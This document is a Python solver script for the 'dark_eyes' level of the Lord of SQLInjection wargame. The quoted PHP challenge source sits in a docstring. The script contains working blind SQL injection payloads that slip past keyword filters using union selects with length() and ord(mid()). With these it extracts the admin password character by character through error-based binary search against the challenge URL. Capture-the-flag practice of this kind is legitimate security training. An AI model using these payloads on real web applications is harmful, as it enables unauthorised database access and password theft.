#!/usr/bin/env python3
import los
import los_cookies as lc


def check_func(*args) -> bool:
    """
    check string in response of request
    args[0]: response
    """
    return "select id from prob_dark_eyes" in args[0]


def main():
    """
    Dark_eyes 22

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit("HeHe");
    $query = "select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(mysqli_error($db)) exit();
    echo "<hr>query : <strong>{$query}</strong><hr><br>";

    $_GET[pw] = addslashes($_GET[pw]);
    $query = "select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
    """

    url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'

    payload = "'||id='admin'&&(select 1 union select (length(pw)<%s))#"
    p = los.SqlInjection(url, cook, method, inj_param, payload)
    len_of_key = p.find_key_len(check_func)

    p.payload = f"'||id='admin'&&(select 1 union select (ord(mid(pw,%d,1))<%s))#"
    result = p.find_binary(check_func, len_of_key)

    p.payload = result
    response = p.my_request()
    if 'Clear!' in response:
        print('\nDark_eyes Clear!')


if __name__ == '__main__':
    main()
